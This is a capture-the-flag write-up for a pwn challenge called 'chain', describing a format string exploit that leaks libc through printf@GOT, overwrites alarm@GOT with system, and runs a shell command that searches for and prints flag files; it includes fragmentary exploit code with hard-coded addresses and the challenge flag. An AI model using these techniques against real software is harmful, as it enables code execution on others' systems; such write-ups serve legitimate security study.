# pwn / still_baby / chain

## Challenge Overview
Name: chain
Author: @hfs
Category: pwn / still_baby
Description: you -> know -> what -> to -> do
Flag format: midnight{...}
Objective: Use the format string vulnerability to leak libc, overwrite control flow, and execute a command that prints the flag.

## Files Provided
- chain.tar.gz
- chain/chain-f1301a4f53983c2b9310ce27c11fb1d7

## Solution Plan
1. Use the format string bug to leak stack and heap values.
2. Redirect format string argument pointers to leak `printf@GOT` and calculate the libc base.
3. Overwrite `alarm@GOT` with `system`, build a small cdecl call frame, and return into the overwritten PLT entry with a flag-reading command.

## Code (Exploit Script)
```bash
python3 solve_chain.py
```

```python
PRINTF_GOT = 0x0804C004
ALARM_GOT = 0x0804C010
ALARM_PLT = 0x08049070
LOOP_RET = 0x08049361
PRINTF_OFF = 0x57520
SYSTEM_OFF = 0x47CD0

sendline(sock, "%6$08x.%16$08x")

sendline(sock, b"LEAK%12$sDONE")
printf_addr = struct.unpack("<I", leak)[0]
libc_base = printf_addr - PRINTF_OFF
system_addr = libc_base + SYSTEM_OFF

cmd = "id;find / -maxdepth 3 -type f -name '*flag*' -exec cat {} \\; 2>/dev/null;#"
```

## Flag
```txt
midnight{4ny_pTr_1s_g00d_f0r_m3}
```

## Notes
Both flags were submitted successfully during solving.
